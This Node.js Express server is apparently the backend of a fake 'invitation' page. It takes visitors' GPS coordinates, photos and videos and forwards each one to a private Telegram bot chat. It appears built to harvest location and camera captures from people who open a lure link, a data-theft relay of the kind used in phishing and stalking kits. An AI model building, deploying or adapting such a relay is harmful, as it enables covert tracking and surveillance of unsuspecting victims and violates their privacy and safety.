import express from "express";
import axios from "axios";
import multer from "multer";
import cors from "cors";
import fs from "fs";
import FormData from "form-data";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static("public"));

// Buat folder uploads jika belum ada
if (!fs.existsSync("uploads")) fs.mkdirSync("uploads");

const upload = multer({ dest: "uploads/" });

// Ambil dari Environment Variables Railway
const PORT = process.env.PORT || 3000;
const TOKEN = process.env.TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get("/", (req, res) => {
    res.send("Server Undangan Aktif 🚀");
});

app.post("/kirim-lokasi", async (req, res) => {
    try {
        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
            chat_id: CHAT_ID,
            latitude: req.body.latitude,
            longitude: req.body.longitude
        });
        res.json({ status: "ok" });
    } catch (err) {
        res.status(500).send(err.message);
    }
});

app.post("/kirim-foto", upload.single("photo"), async (req, res) => {
    try {
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("photo", fs.createReadStream(req.file.path));

        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, fd, {
            headers: fd.getHeaders()
        });
        fs.unlinkSync(req.file.path);
        res.json({ status: "ok" });
    } catch (err) {
        if (req.file) fs.unlinkSync(req.file.path);
        res.status(500).send(err.message);
    }
});

app.post("/kirim-video", upload.single("video"), async (req, res) => {
    try {
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("video", fs.createReadStream(req.file.path));

        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendVideo`, fd, {
            headers: fd.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        fs.unlinkSync(req.file.path);
        res.json({ status: "ok" });
    } catch (err) {
        if (req.file) fs.unlinkSync(req.file.path);
        res.status(500).send(err.message);
    }
});

app.listen(PORT, () => {
    console.log(`Server berjalan di port ${PORT}`);
});